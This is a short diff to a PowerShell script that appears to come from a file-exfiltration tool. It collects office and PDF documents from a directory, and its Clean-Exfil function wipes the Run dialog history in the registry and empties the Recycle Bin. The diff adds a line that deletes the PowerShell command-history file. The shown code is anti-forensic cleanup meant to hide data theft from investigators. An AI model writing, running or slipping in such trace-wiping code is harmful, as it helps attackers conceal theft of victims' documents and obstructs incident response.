@@ -9,6 +9,7 @@ foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.
 }
 function Clean-Exfil{
     reg delete HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Explorer\RunMRU /va /f
+    Remove-Item (Get-PSreadlineOption).HistorySavePath
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
- }
- Clean-Exfil
+}
+Clean-Exfil
